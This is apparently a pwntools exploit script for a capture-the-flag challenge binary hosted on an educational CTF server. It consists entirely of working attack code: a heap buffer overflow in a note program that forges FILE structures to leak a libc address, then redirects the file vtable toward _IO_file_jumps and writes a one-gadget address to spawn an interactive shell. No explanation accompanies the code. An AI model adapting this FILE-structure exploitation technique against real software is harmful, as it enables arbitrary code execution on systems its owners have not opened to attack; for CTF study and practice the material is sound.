from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

isRemote = False
if isRemote: 
    r = remote('edu-ctf.zoolab.org', 30218)
else:
    r = process('./chal')

def mywrite(data):
    r.sendlineafter("note\n> ", b'2')
    r.sendlineafter('data> ', data)

def mysave():
    r.sendlineafter("note\n> ", b'3')
    
flags = 0x1800 
payload1 = flat(
    flags, 0,
    0,0,
    0xdeadbeef,0xdeadbeef + 0x80,
    0,0,
    0,0,
    0,0,
    0,0,
    1 # file descriptor no.
)
payload2 = flat(
    flags, 0,
    0,0
) 

# create note (create new chunk)
r.sendlineafter("note\n> ", b'1')

# 0. write fd
mywrite(b"A"*0x210 + payload1)
mysave()

# 1. restore address
mywrite(b"A"*0x30)

# Remote's buffer size is different from local
if isRemote:
    for i in range(8):
        mysave()
else:
    mysave()
# 2. write leak address payload
mywrite(b"A"*0x210 + payload2)
mysave()


res = r.recv(0x10*8)
print("Real res", res)
addr = r.recv(8)
print("addr: ", addr)
libc_addr = int.from_bytes(addr, 'little') - 0x1ecf60
print("Libc: ", hex(libc_addr))


# 3. exploit
l = ELF('../libc.so.6')
_IO_file_jumps = libc_addr + l.sym['_IO_file_jumps'] # vtable
# one_gagdet = libc_addr + 0xe6c7e
# one_gagdet = libc_addr + 0xe6c81
one_gagdet = libc_addr + 0xe6c84

print("one gagdet", hex(one_gagdet))
print("jump: ", hex(_IO_file_jumps))
payload3 = flat(
    flags, 0,
    0,0,
    0xdeadbeef, _IO_file_jumps + 0x18, 
    _IO_file_jumps + 0x20,
)

mywrite(p64(one_gagdet) + b"\x00"*(0x210 - 0x08) + payload3)
gdb.attach(r)
mysave()
res = r.recv()
print("res: ", res)
r.interactive()



